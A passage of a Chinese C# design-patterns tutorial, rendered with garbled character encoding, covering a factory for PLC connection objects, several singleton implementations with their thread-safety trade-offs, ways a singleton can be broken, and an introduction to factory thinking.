<li><strong>å¤šå®ç°å†²çª</strong>ï¼šå¤šä¸ªå®ç°ç±»æ—¶ï¼Œæ³¨å…¥ <code>IPlcConnection</code> ä¼šæŠ¥é”™ï¼ˆå“ªä¸ªå®ç°ï¼Ÿï¼‰ã€‚</li>
<li><strong>çº¯ç²¹æ‰¿è½½</strong>ï¼šå®ƒåªæ˜¯â€œç±»å‹æ ‡ç­¾â€ï¼Œç”¨äºå­—å…¸æˆ–è¿”å›ç±»å‹ï¼Œå®é™…å·¥ä½œç”±å®ç°ç±»åšã€‚</li>
</ul>
<h5 data-id="heading-18">æ­£ç¡®åšæ³•</h5>
<ol start="0">
<li>
<p><strong>æ³¨å†Œå®ç°ç±»</strong>ï¼ˆèƒ½åŠ›æä¾›è€…ï¼‰ï¼š</p>
<p>C#</p>
<pre><code class="hljs language-ini" lang="ini">context.Services.AddTransient&lt;SiemensS7NetConnect&gt;()<span class="hljs-comment">;</span>
context.Services.AddTransient&lt;ModbusTcpConnect&gt;()<span class="hljs-comment">;</span>
</code></pre>
</li>
<li>
<p><strong>å·¥å‚ç”¨å®ç°ç±»åˆ›å»ºæ¥å£å®ä¾‹</strong>ï¼š</p>
<p>C#</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> IPlcConnection <span class="hljs-title">Create</span><span class="hljs-params">(PlcConfig config)</span>
</span>{
 Â   <span class="hljs-keyword">return</span> config.Type <span class="hljs-keyword">switch</span>
 Â   {
 Â  Â  Â   ConnectType.SiemensS7Net =&gt; _provider.<span class="hljs-built_in">GetRequiredService</span>&lt;SiemensS7NetConnect&gt;(),
 Â  Â  Â   _ =&gt; _provider.<span class="hljs-built_in">GetRequiredService</span>&lt;ModbusTcpConnect&gt;()
 Â   };
}
</code></pre>
<ul>
<li><strong>ç»“æœ</strong>ï¼šè¿”å› <code>IPlcConnection</code>ï¼ˆæ¥å£ï¼‰ï¼Œä½†å®ä¾‹æ˜¯æ³¨å†Œçš„å®ç°ç±»ã€‚</li>
</ul>
</li>
<li>
<p><strong>ç®¡ç†å™¨ç”¨å­—å…¸æ‰¿è½½</strong>ï¼š</p>
<p>C#</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> Dictionary&lt;<span class="hljs-built_in">string</span>, IPlcConnection&gt; _connections;  <span class="hljs-comment">// æ¥å£ä½œä¸ºæ‰¿è½½</span>
</code></pre>
</li>
</ol>
<h4 data-id="heading-19">æ€»ç»“</h4>
<p>å•æ¥å£å¤šå®ä¾‹é€šè¿‡å¤šæ€å®ç°ç»Ÿä¸€ç®¡ç†ï¼Œå­—å…¸å­˜å‚¨ï¼Œæ¥å£è°ƒç”¨ã€‚é€‚åˆå¤æ‚ç³»ç»Ÿï¼Œé¿å…if-elseå †ç Œã€‚å®è·µæ—¶ä»æ¥å£å¼€å§‹è®¾è®¡ï¼</p>
<h2 data-id="heading-20">å•ä¾‹è®¾è®¡æ¨¡å¼ï¼ˆSingleton Patternï¼‰</h2>
<h3 data-id="heading-21">1. å¼•è¨€</h3>
<p>å•ä¾‹è®¾è®¡æ¨¡å¼æ˜¯ä¸€ç§åˆ›å»ºå‹è®¾è®¡æ¨¡å¼ï¼Œç¡®ä¿ä¸€ä¸ªç±»<strong>åªæœ‰ä¸€ä¸ªå®ä¾‹</strong>ï¼Œå¹¶æä¾›ä¸€ä¸ªå…¨å±€è®¿é—®ç‚¹æ¥è·å–è¯¥å®ä¾‹ã€‚å®ƒé€šå¸¸ç”¨äºç®¡ç†å…±äº«èµ„æºï¼Œå¦‚æ•°æ®åº“è¿æ¥ã€é…ç½®æ–‡ä»¶æˆ–æ—¥å¿—è®°å½•å™¨ï¼Œé¿å…é‡å¤åˆ›å»ºå®ä¾‹å¯¼è‡´çš„èµ„æºæµªè´¹æˆ–çŠ¶æ€ä¸ä¸€è‡´ã€‚</p>
<ul>
<li><strong>èµ·æº</strong>ï¼šæ¥è‡ªã€Šè®¾è®¡æ¨¡å¼ï¼šå¯å¤ç”¨é¢å‘å¯¹è±¡è½¯ä»¶çš„åŸºç¡€ã€‹ï¼ˆGoF, 1994ï¼‰ã€‚</li>
<li><strong>é€‚ç”¨è¯­è¨€</strong>ï¼šå¹¿æ³›ç”¨äºé¢å‘å¯¹è±¡è¯­è¨€ï¼Œå¦‚Javaã€C#ã€C++ç­‰ã€‚æœ¬ç¬”è®°ä»¥C#ä¸ºä¾‹ï¼Œå…¶ä»–è¯­è¨€ç±»ä¼¼ã€‚</li>
<li><strong>é™æ€ç±»</strong>ï¼šæ›´åƒæ˜¯ä¸€ç§â€œé™æ€å•ä¾‹â€çš„ç®€åŒ–ç‰ˆæœ¬ï¼Œæ²¡æœ‰å®ä¾‹åŒ–è¿‡ç¨‹ï¼Œæ‰€æœ‰ä¸œè¥¿éƒ½æ˜¯é™æ€çš„ã€‚å®ƒä¸èƒ½ç»§æ‰¿æˆ–å®ç°æ¥å£ï¼Œä½†å¯¹äºç®€å•çš„å…¨å±€è®¿é—®åœºæ™¯å¾ˆæ–¹ä¾¿,ä¸å®Œå…¨ç­‰äºå•ä¾‹è®¾è®¡æ¨¡å¼</li>
</ul>
<h3 data-id="heading-22">2. æ ¸å¿ƒè¦ç´ </h3>
<ul>
<li><strong>ç§æœ‰æ„é€ å‡½æ•°</strong>ï¼šé˜²æ­¢å¤–éƒ¨é€šè¿‡<code>new</code>å…³é”®å­—ç›´æ¥å®ä¾‹åŒ–ç±»ã€‚</li>
<li><strong>é™æ€å®ä¾‹å­—æ®µ</strong>ï¼šå­˜å‚¨å”¯ä¸€çš„å®ä¾‹ï¼ˆé€šå¸¸æ˜¯ç§æœ‰é™æ€ï¼‰ã€‚</li>
<li><strong>é™æ€è·å–æ–¹æ³•</strong>ï¼šæä¾›å…¨å±€è®¿é—®ç‚¹ï¼Œå¦‚<code>GetInstance()</code>ï¼Œè¿”å›å”¯ä¸€å®ä¾‹ã€‚</li>
<li><strong>å»¶è¿Ÿåˆå§‹åŒ–</strong>ï¼ˆå¯é€‰ï¼‰ï¼šå®ä¾‹åœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶åˆ›å»ºï¼Œè€Œéç±»åŠ è½½æ—¶ã€‚</li>
</ul>
<p>åŸºæœ¬ç»“æ„ï¼ˆä¼ªä»£ç ï¼‰ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Singleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;  <span class="hljs-comment">// é™æ€å®ä¾‹</span>
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Singleton</span>()</span> {}  <span class="hljs-comment">// ç§æœ‰æ„é€ å‡½æ•°</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title">GetInstance</span>()</span> {
        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {
            instance = <span class="hljs-keyword">new</span> Singleton();
        }
        <span class="hljs-keyword">return</span> instance;
    }
}
</code></pre>
<h3 data-id="heading-23">3. å¸¸è§å®ç°æ–¹å¼</h3>
<p>ä»¥ä¸‹æ˜¯å‡ ç§ç»å…¸å®ç°ï¼ŒæŒ‰å¤æ‚åº¦ä»ä½åˆ°é«˜æ’åºã€‚æ¯ç§æ–¹å¼éƒ½è€ƒè™‘çº¿ç¨‹å®‰å…¨ã€æ€§èƒ½å’Œå»¶è¿Ÿåˆå§‹åŒ–ã€‚</p>
<h4 data-id="heading-24">3.1 é¥¿æ±‰å¼ï¼ˆEager Initializationï¼‰</h4>
<ul>
<li>
<p><strong>æè¿°</strong>ï¼šåœ¨ç±»åŠ è½½æ—¶å°±åˆ›å»ºå®ä¾‹ã€‚</p>
</li>
<li>
<p><strong>ä¼˜ç‚¹</strong>ï¼šç®€å•ã€çº¿ç¨‹å®‰å…¨ï¼ˆJVM/CLRä¿è¯ç±»åŠ è½½æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼‰ã€‚</p>
</li>
<li>
<p><strong>ç¼ºç‚¹</strong>ï¼šå¦‚æœå®ä¾‹åˆå§‹åŒ–è€—æ—¶æˆ–å ç”¨èµ„æºå¤§ï¼Œä¼šé€ æˆæµªè´¹ï¼ˆå³ä½¿ä»æœªä½¿ç”¨ï¼‰ã€‚</p>
</li>
<li>
<p><strong>é€‚ç”¨</strong>ï¼šå®ä¾‹è½»é‡ä¸”æ€»æ˜¯éœ€è¦æ—¶ã€‚</p>
</li>
<li>
<p>ä»£ç ç¤ºä¾‹</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Singleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">readonly</span> Singleton instance = <span class="hljs-keyword">new</span> Singleton();
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Singleton</span>()</span> {}
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title">GetInstance</span>()</span> =&gt; instance;
}
</code></pre>
<ul>
<li><code>sealed</code>ï¼šé˜²æ­¢ç»§æ‰¿ï¼ˆå¯é€‰ï¼Œä½†æ¨èï¼‰ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-25">3.2 æ‡’æ±‰å¼ï¼ˆLazy Initializationï¼‰</h4>
<ul>
<li>
<p><strong>æè¿°</strong>ï¼šç¬¬ä¸€æ¬¡è°ƒç”¨<code>GetInstance()</code>æ—¶æ‰åˆ›å»ºå®ä¾‹ã€‚</p>
</li>
<li>
<p><strong>ä¼˜ç‚¹</strong>ï¼šèŠ‚çœèµ„æºï¼Œå»¶è¿Ÿåˆå§‹åŒ–ã€‚</p>
</li>
<li>
<p><strong>ç¼ºç‚¹</strong>ï¼šéçº¿ç¨‹å®‰å…¨ã€‚å¤šçº¿ç¨‹ä¸‹å¯èƒ½åˆ›å»ºå¤šä¸ªå®ä¾‹ï¼ˆç«æ€æ¡ä»¶ï¼‰ã€‚</p>
</li>
<li>
<p><strong>é€‚ç”¨</strong>ï¼šå•çº¿ç¨‹ç¯å¢ƒæˆ–å®ä¾‹åˆ›å»ºä¸é¢‘ç¹ã€‚</p>
</li>
<li>
<p>ä»£ç ç¤ºä¾‹</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Singleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Singleton</span>()</span> {}
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title">GetInstance</span>()</span> {
        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {
            instance = <span class="hljs-keyword">new</span> Singleton();
        }
        <span class="hljs-keyword">return</span> instance;
    }
}
</code></pre>
</li>
</ul>
<h4 data-id="heading-26">3.3 æ‡’æ±‰å¼åŠ é”ï¼ˆThread-Safe Lazy with Lockï¼‰</h4>
<ul>
<li>
<p><strong>æè¿°</strong>ï¼šåœ¨æ‡’æ±‰å¼åŸºç¡€ä¸ŠåŠ åŒé‡æ£€æŸ¥é”å®šï¼ˆDouble-Checked Lockingï¼‰ï¼Œç¡®ä¿çº¿ç¨‹å®‰å…¨ã€‚</p>
</li>
<li>
<p><strong>ä¼˜ç‚¹</strong>ï¼šçº¿ç¨‹å®‰å…¨ã€å»¶è¿Ÿåˆå§‹åŒ–ã€‚</p>
</li>
<li>
<p><strong>ç¼ºç‚¹</strong>ï¼šé”å¼€é”€å½±å“æ€§èƒ½ï¼›ä»£ç ç¨å¤æ‚ã€‚</p>
</li>
<li>
<p><strong>é€‚ç”¨</strong>ï¼šå¤šçº¿ç¨‹ç¯å¢ƒï¼Œéœ€è¦å¹³è¡¡æ€§èƒ½ã€‚</p>
</li>
<li>
<p>ä»£ç ç¤ºä¾‹</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Singleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Singleton instance;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">readonly</span> <span class="hljs-built_in">object</span> lockObj = <span class="hljs-keyword">new</span> <span class="hljs-built_in">object</span>();
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Singleton</span>()</span> {}
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title">GetInstance</span>()</span> {
        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {
            <span class="hljs-keyword">lock</span> (lockObj) {
                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {  <span class="hljs-comment">// åŒé‡æ£€æŸ¥</span>
                    instance = <span class="hljs-keyword">new</span> Singleton();
                }
            }
        }
        <span class="hljs-keyword">return</span> instance;
    }
}
</code></pre>
</li>
</ul>
<h4 data-id="heading-27">3.4 é™æ€å†…éƒ¨ç±»ï¼ˆStatic Inner Class / Holder Patternï¼‰</h4>
<ul>
<li>
<p><strong>æè¿°</strong>ï¼šåˆ©ç”¨åµŒå¥—ç±»çš„å»¶è¿ŸåŠ è½½ç‰¹æ€§ã€‚å†…éƒ¨ç±»åœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶åŠ è½½ï¼Œåˆ›å»ºå®ä¾‹ã€‚</p>
</li>
<li>
<p><strong>ä¼˜ç‚¹</strong>ï¼šçº¿ç¨‹å®‰å…¨ã€å»¶è¿Ÿåˆå§‹åŒ–ã€æ— é”å¼€é”€ï¼ˆJVM/CLRä¿è¯ï¼‰ã€‚</p>
</li>
<li>
<p><strong>ç¼ºç‚¹</strong>ï¼šä»£ç ç»“æ„ç¨å¤æ‚ã€‚</p>
</li>
<li>
<p><strong>é€‚ç”¨</strong>ï¼šå¤šçº¿ç¨‹ç¯å¢ƒï¼Œè¿½æ±‚é«˜æ•ˆã€‚</p>
</li>
<li>
<p>ä»£ç ç¤ºä¾‹</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Singleton</span> {
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Singleton</span>()</span> {}
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title">SingletonHolder</span> {
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">readonly</span> Singleton instance = <span class="hljs-keyword">new</span> Singleton();
    }
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title">GetInstance</span>()</span> =&gt; SingletonHolder.instance;
}
</code></pre>
</li>
</ul>
<h4 data-id="heading-28">3.5 C#ä¸“ç”¨ï¼šä½¿ç”¨ Lazy</h4>
<ul>
<li>
<p><strong>æè¿°</strong>ï¼šåˆ©ç”¨.NETçš„<code>Lazy&lt;T&gt;</code>ç±»ï¼Œè‡ªåŠ¨å¤„ç†çº¿ç¨‹å®‰å…¨å’Œå»¶è¿Ÿåˆå§‹åŒ–ã€‚</p>
</li>
<li>
<p><strong>ä¼˜ç‚¹</strong>ï¼šç®€æ´ã€çº¿ç¨‹å®‰å…¨ã€æ”¯æŒå¼‚å¸¸å¤„ç†å’Œè‡ªå®šä¹‰åˆå§‹åŒ–é€»è¾‘ã€‚</p>
</li>
<li>
<p><strong>ç¼ºç‚¹</strong>ï¼šä¾èµ–.NET Framework/Coreï¼Œç¨æœ‰æ€§èƒ½å¼€é”€ã€‚</p>
</li>
<li>
<p><strong>é€‚ç”¨</strong>ï¼šç°ä»£C#é¡¹ç›®ã€‚</p>
</li>
<li>
<p>ä»£ç ç¤ºä¾‹</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">sealed</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Singleton</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">readonly</span> Lazy&lt;Singleton&gt; lazy = <span class="hljs-keyword">new</span> Lazy&lt;Singleton&gt;(() =&gt; <span class="hljs-keyword">new</span> Singleton());
    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-title">Singleton</span>()</span> {}
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title">GetInstance</span>()</span> =&gt; lazy.Value;
}
</code></pre>
</li>
</ul>
<h4 data-id="heading-29">3.6 å…¶ä»–å˜ä½“</h4>
<ul>
<li><strong>æšä¸¾å•ä¾‹</strong>ï¼šåœ¨C#ä¸­ä¸å¸¸è§ï¼ˆæšä¸¾ä¸èƒ½æœ‰ç§æœ‰æ„é€ å‡½æ•°ï¼‰ï¼Œä½†åœ¨Javaä¸­å¯ç”¨ã€‚</li>
<li><strong>æ³¨å†Œè¡¨å•ä¾‹</strong>ï¼šç»´æŠ¤ä¸€ä¸ªå®ä¾‹æ³¨å†Œè¡¨ï¼Œæ”¯æŒå¤šä¸ªå•ä¾‹ç±»ã€‚</li>
<li><strong>å¤šä¾‹æ¨¡å¼</strong>ï¼šå•ä¾‹çš„æ‰©å±•ï¼Œå…è®¸å¤šä¸ªå®ä¾‹ï¼ˆå¦‚è¿æ¥æ± ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-30">4. ä¼˜ç‚¹ä¸ç¼ºç‚¹</h3>
<h4 data-id="heading-31">ä¼˜ç‚¹</h4>
<ul>
<li><strong>èµ„æºæ§åˆ¶</strong>ï¼šé¿å…é‡å¤åˆ›å»ºå®ä¾‹ï¼ŒèŠ‚çœå†…å­˜å’Œèµ„æºã€‚</li>
<li><strong>å…¨å±€è®¿é—®</strong>ï¼šæä¾›ç»Ÿä¸€è®¿é—®ç‚¹ï¼Œä¾¿äºç®¡ç†ã€‚</li>
<li><strong>å»¶è¿ŸåŠ è½½</strong>ï¼šæŸäº›å®ç°æ”¯æŒæŒ‰éœ€åˆ›å»ºã€‚</li>
<li><strong>ç®€å•æ€§</strong>ï¼šå®ç°ç›¸å¯¹å®¹æ˜“ã€‚</li>
</ul>
<h4 data-id="heading-32">ç¼ºç‚¹</h4>
<ul>
<li><strong>ç´§è€¦åˆ</strong>ï¼šå…¨å±€çŠ¶æ€å¯èƒ½å¯¼è‡´ä»£ç éš¾ä»¥æµ‹è¯•å’Œç»´æŠ¤ï¼ˆè¿åå•ä¸€èŒè´£ï¼‰ã€‚</li>
<li><strong>çº¿ç¨‹å®‰å…¨å¤æ‚</strong>ï¼šå¤šçº¿ç¨‹ä¸‹éœ€é¢å¤–å¤„ç†ï¼Œå¦åˆ™æ˜“å‡ºé”™ã€‚</li>
<li><strong>ç»§æ‰¿å›°éš¾</strong>ï¼šç§æœ‰æ„é€ å‡½æ•°é˜»æ­¢ç»§æ‰¿ã€‚</li>
<li><strong>åºåˆ—åŒ–é—®é¢˜</strong>ï¼šååºåˆ—åŒ–æ—¶å¯èƒ½ç ´åå•ä¾‹ï¼ˆéœ€å®ç°<code>ISerializable</code>æˆ–ä½¿ç”¨<code>[Serializable]</code>å¹¶é‡å†™<code>OnDeserialized</code>ï¼‰ã€‚</li>
<li><strong>æµ‹è¯•æŒ‘æˆ˜</strong>ï¼šéš¾ä»¥mockæˆ–æ›¿æ¢å®ä¾‹ã€‚</li>
</ul>
<h3 data-id="heading-33">5. åº”ç”¨åœºæ™¯</h3>
<ul>
<li><strong>èµ„æºç®¡ç†</strong>ï¼šæ•°æ®åº“è¿æ¥ã€æ–‡ä»¶å¥æŸ„ã€ç½‘ç»œå¥—æ¥å­—ã€‚</li>
<li><strong>é…ç½®ç®¡ç†</strong>ï¼šå…¨å±€é…ç½®æ–‡ä»¶æˆ–è®¾ç½®ã€‚</li>
<li><strong>æ—¥å¿—è®°å½•</strong>ï¼šç»Ÿä¸€çš„æ—¥å¿—å™¨ã€‚</li>
<li><strong>ç¼“å­˜</strong>ï¼šå…±äº«ç¼“å­˜å®ä¾‹ã€‚</li>
<li><strong>ç¡¬ä»¶æ¥å£</strong>ï¼šå¦‚æ‰“å°æœºç®¡ç†å™¨ã€‚</li>
<li><strong>æ¸¸æˆå¼€å‘</strong>ï¼šæ¸¸æˆç®¡ç†å™¨ã€éŸ³æ•ˆç®¡ç†å™¨ã€‚</li>
</ul>
<p>é¿å…è¿‡åº¦ä½¿ç”¨ï¼šä¼˜å…ˆè€ƒè™‘ä¾èµ–æ³¨å…¥ï¼ˆDIï¼‰æ¡†æ¶å¦‚Autofacæ¥ç®¡ç†å•ä¾‹ã€‚</p>
<h3 data-id="heading-34">6. æ½œåœ¨é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-35">6.1 åå°„ç ´åå•ä¾‹</h4>
<ul>
<li>
<p><strong>é—®é¢˜</strong>ï¼šé€šè¿‡åå°„è°ƒç”¨ç§æœ‰æ„é€ å‡½æ•°ï¼Œåˆ›å»ºå¤šä¸ªå®ä¾‹ã€‚</p>
</li>
<li>
<p><strong>ç¤ºä¾‹</strong>ï¼š</p>
</li>
<li>
<pre><code class="hljs language-ini" lang="ini">ConstructorInfo <span class="hljs-attr">ctor</span> = 
typeof(Singleton).GetConstructor(BindingFlags.NonPublic | BindingFlags.Instance, null, Type.EmptyTypes, null)<span class="hljs-comment">;</span>
Singleton <span class="hljs-attr">extra</span> = (Singleton)ctor.Invoke(null)<span class="hljs-comment">;</span>
</code></pre>
</li>
<li>
<p>è§£å†³æ–¹æ¡ˆ</p>
<ul>
<li>åœ¨æ„é€ å‡½æ•°ä¸­æ£€æŸ¥å®ä¾‹æ˜¯å¦å­˜åœ¨ï¼ŒæŠ›å‡ºå¼‚å¸¸ã€‚</li>
<li>ä½¿ç”¨æšä¸¾ï¼ˆä½†C#ä¸æ”¯æŒï¼‰ã€‚</li>
<li>æˆ–æ¥å—é£é™©ï¼Œåœ¨æ–‡æ¡£ä¸­è¯´æ˜ã€‚</li>
</ul>
</li>
</ul>
<h4 data-id="heading-36">6.2 å¤šçº¿ç¨‹é—®é¢˜</h4>
<ul>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šä½¿ç”¨é”ï¼ˆå¦‚åŒé‡æ£€æŸ¥ï¼‰ã€é™æ€å†…éƒ¨ç±»æˆ–<code>Lazy&lt;T&gt;</code>ã€‚</li>
</ul>
<h4 data-id="heading-37">6.3 åºåˆ—åŒ–/ååºåˆ—åŒ–</h4>
<ul>
<li><strong>é—®é¢˜</strong>ï¼šååºåˆ—åŒ–æ—¶å¯èƒ½åˆ›å»ºæ–°å®ä¾‹ã€‚</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šå®ç°<code>ISerializable</code>ï¼Œåœ¨<code>GetObjectData</code>ä¸­è¿”å›ç°æœ‰å®ä¾‹ï¼Œæˆ–é‡å†™<code>OnDeserialized</code>ã€‚</li>
</ul>
<h4 data-id="heading-38">6.4 å…‹éš†ç ´å</h4>
<ul>
<li><strong>é—®é¢˜</strong>ï¼šå¦‚æœç±»å®ç°<code>ICloneable</code>ï¼Œå¯èƒ½è¢«å…‹éš†ã€‚</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šåœ¨<code>Clone()</code>ä¸­è¿”å›è‡ªèº«ï¼Œæˆ–ä¸å®ç°å…‹éš†ã€‚</li>
</ul>
<h4 data-id="heading-39">6.5 åƒåœ¾å›æ”¶</h4>
<ul>
<li><strong>é—®é¢˜</strong>ï¼šé™æ€å®ä¾‹å¯èƒ½é˜»æ­¢åƒåœ¾å›æ”¶ã€‚</li>
<li><strong>è§£å†³æ–¹æ¡ˆ</strong>ï¼šè€ƒè™‘å¼±å¼•ç”¨æˆ–æ‰‹åŠ¨é‡Šæ”¾ï¼ˆä½†ä¸å¸¸è§ï¼‰ã€‚</li>
</ul>
<h2 data-id="heading-40">å·¥å‚æ€æƒ³(Factory thinking)</h2>
<p><strong>å…ˆç†è§£â€œå·¥å‚æ€æƒ³â€â€”â€”æœ€æ ¸å¿ƒçš„ç†å¿µ</strong></p>
<p>æƒ³è±¡ä½ åœ¨å¼€ä¸€å®¶æŠ«è¨åº—ï¼ˆPizza Hutï¼‰ã€‚é¡¾å®¢æ¥ç‚¹é¤æ—¶ï¼Œä½ ä¸ç”¨å‘Šè¯‰ä»–ä»¬â€œå»å¨æˆ¿æ‰¾é¢ç²‰ã€ç•ªèŒ„é…±ã€èŠå£«ï¼Œè‡ªå·±åšæŠ«è¨â€ã€‚ç›¸åï¼Œä½ åªè¯´ï¼šâ€œæˆ‘è¦ä¸€ä¸ªç›æ ¼ä¸½å¡”æŠ«è¨ï¼â€ç„¶ååº—å‘˜ï¼ˆå·¥å‚ï¼‰è´Ÿè´£ä¸€åˆ‡ï¼šé€‰æ–™ã€çƒ¤åˆ¶ã€æ‰“åŒ…ã€‚ä½ ä½œä¸ºé¡¾å®¢ï¼Œåªå…³å¿ƒâ€œè¦ä»€ä¹ˆâ€ï¼Œå·¥å‚è´Ÿè´£â€œæ€ä¹ˆåšâ€ã€‚</p>
<p>è¿™å°±æ˜¯<strong>å·¥å‚æ€æƒ³</strong>ï¼š<strong>ç»Ÿä¸€ç®¡ç†å¯¹è±¡çš„åˆ›å»ºï¼Œè®©ä½¿ç”¨è€…ä¸ç”¨æ“å¿ƒç»†èŠ‚</strong>ã€‚åœ¨ä»£ç é‡Œï¼Œâ€œå¯¹è±¡â€å°±æ˜¯ç±»å®ä¾‹ï¼ˆæ¯”å¦‚åˆ›å»ºä¸€ä¸ªæ•°æ®åº“è¿æ¥æˆ–ä¸€ä¸ªPLCå®¢æˆ·ç«¯ï¼‰ã€‚å¥½å¤„æ˜¯ï¼š</p>
<ul>
<li>è§£è€¦ï¼šä»£ç æ›´çµæ´»ï¼Œæ”¹åˆ›å»ºé€»è¾‘ä¸å½±å“ä½¿ç”¨çš„åœ°æ–¹ã€‚</li>
<li>å¯æ‰©å±•ï¼šæƒ³åŠ æ–°æŠ«è¨ï¼ˆæ–°å¯¹è±¡ï¼‰ï¼Œåªæ”¹å·¥å‚ï¼Œä¸æ”¹é¡¾å®¢ä»£ç ã€‚</li>
</ul>
<p><strong>å·¥å‚æ€æƒ³ vs å·¥å‚æ¨¡å¼ vs å·¥å‚æœºåˆ¶</strong>ï¼š</p>
<ul>
<li><strong>å·¥å‚æ€æƒ³</strong>ï¼šä¸€ç§â€œæŠŠåˆ›å»ºå¯¹è±¡é›†ä¸­èµ·æ¥â€çš„æ€ç»´ï¼ˆä¸ç­‰äºæŸä¸ªå›ºå®šå†™æ³•ï¼‰</li>
<li><strong>å·¥å‚æ¨¡å¼</strong>ï¼šGoF è®¾è®¡æ¨¡å¼é‡Œä¸€å¥—å…·ä½“å†™æ³•ï¼ˆç®€å•å·¥å‚ / å·¥å‚æ–¹æ³• / æŠ½è±¡å·¥å‚ï¼‰</li>
<li><strong>å·¥å‚æœºåˆ¶</strong>ï¼šåƒ.NETçš„<code>HttpClientFactory</code>ï¼Œæ˜¯æ¡†æ¶å†…ç½®çš„â€œå·¥å‚ç³»ç»Ÿâ€ï¼Œä½ ç›´æ¥ç”¨ï¼Œä¸ç”¨è‡ªå·±å†™ã€‚</li>
</ul>
<blockquote>
<p>å·¥å‚ç›¸å…³çš„ä¸€åˆ‡ï¼Œæœ¬è´¨éƒ½åœ¨è§£å†³ï¼š<strong>æŠŠ <code>new</code> è—èµ·æ¥ï¼Œè®©ä½¿ç”¨è€…åªè¡¨è¾¾â€œæˆ‘è¦ä»€ä¹ˆâ€ï¼Œä¸æ“å¿ƒâ€œæ€ä¹ˆé€ â€ã€‚</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-41">ä¸ºä»€ä¹ˆè¦â€œè— newâ€ï¼Ÿ</h3>
<p>å¦‚æœä½ åœ¨ä¸šåŠ¡ä»£ç åˆ°å¤„å†™ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">plc</span> = new SiemensPlcClient(...)<span class="hljs-comment">;</span>
// æˆ–
var <span class="hljs-attr">plc</span> = new OmronPlcClient(...)<span class="hljs-comment">;</span>
</code></pre>
<p>é—®é¢˜æ˜¯ï¼š</p>
<ol start="0">
<li>ä¸šåŠ¡ä»£ç å¿…é¡»çŸ¥é“â€œå…·ä½“ç±»åâ€ï¼ˆå¼ºè€¦åˆï¼‰</li>
<li>æ–°å¢å“ç‰Œ/ç±»å‹æ—¶ï¼Œä½ å¾—å»æ”¹ä¸€å †åœ°æ–¹çš„ <code>new</code>ï¼ˆä¸ç¬¦åˆå¼€é—­åŸåˆ™ï¼‰</li>
<li>åˆ›å»ºè¿‡ç¨‹å¯èƒ½å¾ˆå¤æ‚ï¼ˆå‚æ•°å¤šã€é…ç½®å¤šã€è¦ç¼“å­˜ã€è¦æ—¥å¿—â€¦â€¦ï¼‰ï¼Œæ•£è½åœ¨å„å¤„ä¼šå˜æˆç¾éš¾</li>
</ol>
<p>æ‰€ä»¥å·¥å‚æ€æƒ³å°±æ˜¯ï¼š</p>
<ul>
